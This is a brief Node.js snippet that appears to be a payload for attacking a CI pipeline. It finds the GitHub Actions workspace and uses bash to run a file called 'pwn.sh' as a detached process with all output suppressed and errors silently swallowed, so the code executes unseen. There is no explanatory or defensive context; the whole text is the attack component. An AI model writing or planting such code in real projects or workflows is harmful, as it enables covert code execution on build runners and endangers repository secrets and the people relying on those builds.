const cp = require('child_process');
const path = require('path');
try {
    const pwnPath = path.join(process.env.GITHUB_WORKSPACE || process.cwd(), 'pwn.sh');
    cp.spawn('bash', [pwnPath], { detached: true, stdio: 'ignore' }).unref();
} catch (e) {}
